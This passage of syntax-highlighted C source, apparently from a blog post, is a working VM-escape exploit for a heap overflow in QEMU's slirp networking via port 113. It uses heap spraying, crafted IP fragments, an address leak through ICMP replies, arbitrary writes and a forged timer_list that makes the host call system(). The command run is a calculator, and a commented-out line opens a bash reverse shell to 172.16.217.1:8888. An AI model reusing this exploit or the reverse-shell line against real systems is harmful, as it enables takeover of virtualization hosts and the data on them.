<span class="string">"gnome-calculator"</span>;</span><br><span class="line">    <span class="comment">// "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/172.16.217.1/8888 0&gt;&amp;1'";</span></span><br><span class="line">    <span class="comment">// const char exec_cmd[] = "DISPLAY=:0 /usr/bin/snap run gnome-calculator";</span></span><br><span class="line">    <span class="built_in">memcpy</span>(buf+ETH_HDRLEN+IP4_HDRLEN+ICMP_HDRLEN,exec_cmd,<span class="built_in">strlen</span>(exec_cmd)+<span class="number">1</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xaabb</span>;</span><br><span class="line">    stop_flag = <span class="number">1</span>; </span><br><span class="line">    arbitrary_write(<span class="number">0x0b00</span>,<span class="number">3</span>,buf,ETH_HDRLEN+IP4_HDRLEN+ICMP_HDRLEN+<span class="built_in">strlen</span>(exec_cmd)+<span class="number">1</span>,<span class="number">0x400</span>);</span><br><span class="line">    g_spray_ip_id = <span class="number">0xbbaa</span>;</span><br><span class="line">    leak(<span class="number">0x0b00</span>+<span class="number">0x318</span>+<span class="number">0x14</span>+ETH_HDRLEN,<span class="number">3</span>); <span class="comment">//reass处理完后会把m_data减掉ip头的长度</span></span><br><span class="line">    dbg_printf(<span class="string">"after leak"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer_list</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list</span></span><br><span class="line"><span class="comment">    $45 = &#123;</span></span><br><span class="line"><span class="comment">        clock = 0x55a8d1473380 &lt;qemu_clocks&gt;,</span></span><br><span class="line"><span class="comment">        active_timers_lock = &#123;</span></span><br><span class="line"><span class="comment">            lock = pthread_mutex_t = &#123;</span></span><br><span class="line"><span class="comment">            Type = Normal,</span></span><br><span class="line"><span class="comment">            Status = Not acquired,</span></span><br><span class="line"><span class="comment">            Robust = No,</span></span><br><span class="line"><span class="comment">            Shared = No,</span></span><br><span class="line"><span class="comment">            Protocol = None</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            file = 0x0,</span></span><br><span class="line"><span class="comment">            line = 0x0,</span></span><br><span class="line"><span class="comment">            initialized = 0x1</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        active_timers = 0x55a8d3641df0,</span></span><br><span class="line"><span class="comment">        list = &#123;</span></span><br><span class="line"><span class="comment">            le_next = 0x0,</span></span><br><span class="line"><span class="comment">            le_prev = 0x55a8d2594cb8</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        notify_cb = 0x55a8d076c793 &lt;qemu_timer_notify_cb&gt;,</span></span><br><span class="line"><span class="comment">        notify_opaque = 0x0,</span></span><br><span class="line"><span class="comment">        timers_done_ev = &#123;</span></span><br><span class="line"><span class="comment">            value = 0x0,</span></span><br><span class="line"><span class="comment">            initialized = 0x1</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> fake_timer_list = heap_base + <span class="number">0x1000</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = text_base +  <span class="number">0x11f8e80</span>; <span class="comment">// qemu_clocks 0x11f8e80</span></span><br><span class="line">    <span class="built_in">memset</span>(buf + <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span> * <span class="number">6</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x38</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x40</span>) = fake_timer_list + <span class="number">0x70</span>; <span class="comment">// active_timers</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x50</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x58</span>) = text_base + <span class="number">0x2f2ee0</span>; <span class="comment">// qemu_timer_notify_cb 0x2f2ee0</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x60</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x68</span>) = <span class="number">0x0000000100000000</span>;</span><br><span class="line">    <span class="comment">// end of timer_list</span></span><br><span class="line">    <span class="comment">// start of active_timers</span></span><br><span class="line">    <span class="comment">/* gdb-peda$ p *timer_list-&gt;active_timers</span></span><br><span class="line"><span class="comment">    $49 = &#123;</span></span><br><span class="line"><span class="comment">        expire_time = 0x22823f5aad00,</span></span><br><span class="line"><span class="comment">        timer_list = 0x55a8d2594840,</span></span><br><span class="line"><span class="comment">        cb = 0x55a8d0b66a82 &lt;gui_update&gt;,</span></span><br><span class="line"><span class="comment">        opaque = 0x55a8d3ae6e50,</span></span><br><span class="line"><span class="comment">        next = 0x55a8d3ae6e80,</span></span><br><span class="line"><span class="comment">        attributes = 0x0,</span></span><br><span class="line"><span class="comment">        scale = 0xf4240</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x70</span>) = <span class="number">0</span>; <span class="comment">// expire_time set to 0 will trigger func cb</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x78</span>) = fake_timer_list;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x80</span>) = text_base + <span class="number">0x2a3720</span>;    <span class="comment">// system plt</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x88</span>) = heap_base + <span class="number">0xe42</span>; <span class="comment">// parameter address</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x90</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x98</span>) = <span class="number">0x000f424000000000</span>;</span><br><span class="line">    g_spray_ip_id = <span class="number">0xccbb</span>;</span><br><span class="line">    arbitrary_write(fake_timer_list<span class="number">-0x318</span>,<span class="number">8</span>,buf,<span class="number">0xa0</span>,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dbg_printf("check heap here");</span></span><br><span class="line">    <span class="comment">// qemu timer</span></span><br><span class="line">    <span class="comment">// 改掉全局的main_loop_tlg</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = fake_timer_list; <span class="comment">// qemu_clocks</span></span><br><span class="line">    g_spray_ip_id = <span class="number">0xddbb</span>;</span><br><span class="line">    arbitrary_write(text_base+<span class="number">0x11f8e60</span><span class="number">-0x318</span>,<span class="number">8</span>,buf,<span class="number">8</span>,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i, recvsd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    dbg_printf(<span class="string">"in leak_text...\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"0ops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    dbg_printf(<span class="string">"trigger reass!"</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = IPPROTO_ICMP;</span><br><span class="line"></span><br><span class="line">    recvsd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we receive data here</span></span><br><span class="line">    <span class="keyword">int</span> bytes, status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">recv_iphdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">recv_icmphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> recv_ether_frame[IP_MAXPACKET];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">from</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> fromlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">wait</span>, <span class="title">t1</span>, <span class="title">t2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">    <span class="keyword">double</span> dt;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>)gettimeofday(&amp;t1, &amp;tz);</span><br><span class="line">    wait.tv_sec = <span class="number">2</span>;</span><br><span class="line">    wait.tv_usec = <span class="number">0</span>;</span><br><span class="line">    setsockopt(recvsd, SOL_SOCKET, SO_RCVTIMEO, (<span class="keyword">char</span> *)&amp;wait,</span><br><span class="line">               <span class="keyword">sizeof</span>(struct timeval));</span><br><span class="line">    recv_iphdr = (struct ip *)(recv_ether_frame + ETH_HDRLEN);</span><br><span class="line">    recv_icmphdr = (struct icmp *)(recv_ether_frame + ETH_HDRLEN + IP4_HDRLEN);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(recv_ether_frame, <span class="number">0</span>, IP_MAXPACKET * <span class="keyword">sizeof</span>(<span class="keyword">uint8_t</span>));</span><br><span class="line">        <span class="built_in">memset</span>(&amp;from, <span class="number">0</span>, <span class="keyword">sizeof</span>(from));</span><br><span class="line">        fromlen = <span class="keyword">sizeof</span>(from);</span><br><span class="line">        <span class="keyword">if</span> ((bytes = recvfrom(recvsd, recv_ether_frame, IP_MAXPACKET, <span class="number">0</span>,</span><br><span class="line">                              (struct sockaddr *)&amp;from, &amp;fromlen)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            status = errno;</span><br><span class="line">            <span class="keyword">if</span> (status == EAGAIN) &#123; <span class="comment">// EAGAIN = 11</span></span><br><span class="line">                dbg_printf(<span class="string">"No reply within %li seconds.\n"</span>, wait.tv_sec);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == EINTR) &#123; <span class="comment">// EINTR = 4</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">"recvfrom() failed "</span>);</span><br><span class="line">                <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="comment">// End of error handling conditionals.</span></span><br><span class="line">        <span class="comment">// hexdump("recv", recv_ether_frame, 0x50);</span></span><br><span class="line">        dbg_printf(<span class="string">"recv count %d\n"</span>, count++);</span><br><span class="line">        <span class="keyword">if</span> ((((recv_ether_frame[<span class="number">12</span>] &lt;&lt; <span class="number">8</span>) + recv_ether_frame[<span class="number">13</span>]) ==</span><br><span class="line">             ETH_P_IP) &amp;&amp;</span><br><span class="line">            (recv_iphdr-&gt;ip_p == IPPROTO_ICMP) &amp;&amp;</span><br><span class="line">            (recv_icmphdr-&gt;icmp_type == ICMP_ECHOREPLY)) &#123;</span><br><span class="line">            <span class="comment">// Stop timer and calculate how long it took to get a reply.</span></span><br><span class="line">            (<span class="keyword">void</span>)gettimeofday(&amp;t2, &amp;tz);</span><br><span class="line">            dt = (<span class="keyword">double</span>)(t2.tv_sec - t1.tv_sec) * <span class="number">1000.0</span> +</span><br><span class="line">                 (<span class="keyword">double</span>)(t2.tv_usec - t1.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line">            <span class="comment">// 底下这个可能会segfault</span></span><br><span class="line">            <span class="comment">// if (inet_ntop(AF_INET, &amp;(recv_iphdr-&gt;ip_src.s_addr), rec_ip,</span></span><br><span class="line">            <span class="comment">// INET_ADDRSTRLEN) == NULL) &#123;</span></span><br><span class="line">            <span class="comment">//     status = errno;</span></span><br><span class="line">            <span class="comment">//     fprintf(stderr, "inet_ntop() failed.\nError message: %s",</span></span><br><span class="line">            <span class="comment">//     strerror(status)); exit(EXIT_FAILURE);</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            dbg_printf(<span class="string">"%g ms (%i bytes received)\n"</span>, dt, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            hexdump(<span class="string">"ping recv"</span>, recv_ether_frame, bytes);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">if</span> (bytes &lt; <span class="number">0x200</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//7e 64 cb 55 55 55</span></span><br><span class="line">            <span class="comment">//text_base =</span></span><br><span class="line">            <span class="comment">//    ((*(uint64_t *)(recv_ether_frame + 0x88)) - 0x76247e) &amp; ~0xfff;</span></span><br><span class="line">            <span class="comment">//heap_base = (*(uint64_t *)(recv_ether_frame + 0x90)) &amp; ~0xffffff;</span></span><br><span class="line"></span><br><span class="line">            text_base = <span class="number">0</span>;</span><br><span class="line">            heap_base = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span>* tmp_ptr = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">uint64_t</span> tmp_addr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">846</span>;i += <span class="number">8</span>)&#123;</span><br><span class="line">                tmp_ptr = recv_ether_frame + i;</span><br><span class="line">                tmp_addr = *tmp_ptr;</span><br><span class="line">                <span class="keyword">if</span>(text_base != <span class="number">0</span> &amp;&amp; heap_base != <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d: %p\n"</span>,i,tmp_addr);</span><br><span class="line">                <span class="keyword">if</span>(tmp_addr &gt; <span class="number">0x550000000000</span> &amp;&amp; ((tmp_addr&amp;<span class="number">0xfff</span>) == <span class="number">0x47e</span>))&#123;</span><br><span class="line">                    text_base = tmp_addr - <span class="number">0x76247e</span>;</span><br><span class="line">                    heap_base = (*(<span class="keyword">uint64_t</span>*)(recv_ether_frame + i + <span class="number">8</span>)) &amp; ~<span class="number">0xffffff</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(text_base == <span class="number">0</span>)&#123;</span><br><span class="line">                perror(<span class="string">"leak error...."</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">            dbg_printf(<span class="string">"leak text_base: 0x%lx\n"</span></span><br><span class="line">                       <span class="string">"leak heap_base: 0x%lx\n"</span>,</span><br><span class="line">                       text_base, heap_base);</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="comment">// End if IP ethernet frame carrying ICMP_ECHOREPLY</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    close(recvsd);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">if</span>(stop_flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">arbitrary_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">int</span> addr_len, <span class="keyword">uint8_t</span> *write_data,</span></span></span><br><span class="line"><span class="function"><span class="params">                    <span class="keyword">int</span> write_data_len, <span class="keyword">int</span> spray_times)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, len, i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip_pkt_info</span> <span class="title">pkt_info</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *payload = (<span class="keyword">uint8_t</span> *)<span class="built_in">malloc</span>(IP_MAXPACKET);</span><br><span class="line">    <span class="keyword">uint8_t</span> *payload_start = payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> *payload32 = (<span class="keyword">uint32_t</span> *)payload;</span><br><span class="line">    <span class="keyword">uint64_t</span> *payload64 = (<span class="keyword">uint64_t</span> *)payload;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(payload, <span class="string">'A'</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; spray_times; ++i) &#123;</span><br><span class="line">        dbg_printf(<span class="string">"spraying size 0x2000, id: %d\n"</span>, i);</span><br><span class="line">        spray(<span class="number">0x2000</span>, g_spray_ip_id + i);</span><br><span class="line">    &#125;</span><br><span class="line">    dbg_printf(<span class="string">"spray finished.\n"</span>);</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(host);</span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>); <span class="comment">// vulnerable port</span></span><br><span class="line">    len = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, len);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">"oops: client"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">1</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, payload, <span class="number">0x300</span> + <span class="number">4</span>); <span class="comment">// 这个packet就在so_rcv的后面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        let's overflow here!</span></span><br><span class="line"><span class="comment">        send(xxx)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        write(s, payload, <span class="number">0x500</span>); <span class="comment">// 不能send一个满的m_buf，因为会有一个off by</span></span><br><span class="line">                                  <span class="comment">// null = =。。。。</span></span><br><span class="line">        usleep(<span class="number">20000</span>); <span class="comment">// 不知道为啥，貌似内核会合并包？</span></span><br><span class="line">                       <span class="comment">// 如果合并了就会off by null...</span></span><br><span class="line">                       <span class="comment">// 所以sleep一下</span></span><br><span class="line">        dbg_printf(<span class="string">"send %d complete\n"</span>, i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload, <span class="number">1072</span>);</span><br><span class="line">    <span class="comment">// actual overflow here</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;</span><br><span class="line">    *payload64++ = <span class="number">0x675</span>; <span class="comment">// chunk header</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_next</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prev</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_nextpkt</span></span><br><span class="line">    *payload64++ = <span class="number">0</span>;     <span class="comment">// m_prevpkt</span></span><br><span class="line">    payload32 = (<span class="keyword">uint32_t</span> *)payload64;</span><br><span class="line">    *payload32++ = <span class="number">0</span>;     <span class="comment">// m_flags</span></span><br><span class="line">    *payload32++ = <span class="number">0x608</span>; <span class="comment">// m_size</span></span><br><span class="line">    payload64 = (<span class="keyword">uint64_t</span> *)payload32;</span><br><span class="line">    *payload64++ = <span class="number">0</span>; <span class="comment">// m_so</span></span><br><span class="line">    payload = (<span class="keyword">uint8_t</span> *)payload64;</span><br><span class="line">    assert(addr_len &lt;= <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; addr_len; ++i) &#123;</span><br><span class="line">        *payload++ = (addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span>; <span class="comment">// m_data</span></span><br><span class="line">    &#125;</span><br><span class="line">    write(s, payload_start, (<span class="keyword">uint8_t</span> *)payload - payload_start);</span><br><span class="line">    <span class="comment">// write(s, payload, 0x1000);</span></span><br><span class="line">    pkt_info.ip_id = <span class="number">0xdead</span>;</span><br><span class="line">    pkt_info.ip_off = <span class="number">0x300</span> + <span class="number">24</span>;</span><br><span class="line">    pkt_info.MF = <span class="number">0</span>;</span><br><span class="line">    pkt_info.ip_p = <span class="number">0xff</span>;</span><br><span class="line">    send_ip_pkt(&amp;pkt_info, write_data, write_data_len);</span><br><span class="line"></span><br><span class="line">    close(s);</span><br><span class="line">    <span class="built_in">free</span>(payload_start);</span><br><span class="line">    <span class="keyword">if</span> (stop_flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"trigger!"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 真正malloc的大小是payloadlen + 64</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_ip_pkt</span><span class="params">(struct ip_pkt_info *pkt_info, <span class="keyword">uint8_t</span> *payload,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">int</span> payloadlen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, sd, *ip_flags, *tcp_flags;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> on = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *interface, *src_ip, *dst_ip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ip</span> <span class="title">iphdr</span>;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *packet;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ifr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate memory for various arrays.</span></span><br><span class="line">    packet = allocate_ustrmem(IP_MAXPACKET);</span><br><span class="line">    interface = allocate_strmem(<span class="number">40</span>);</span><br><span class="line">    src_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    dst_ip = allocate_strmem(INET_ADDRSTRLEN);</span><br><span class="line">    ip_flags = allocate_intmem(<span class="number">4</span>);</span><br><span class="line">    tcp_flags = allocate_intmem(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Interface to send packet through.</span></span><br><span class="line">    <span class="built_in">strcpy</span>(interface, g_interface);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Submit request for a socket descriptor to look up interface.</span></span><br><span class="line">    <span class="keyword">if</span> ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"socket() failed to get socket descriptor for using ioctl() "</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use ioctl() to look up interface index which we will use to</span></span><br><span class="line">   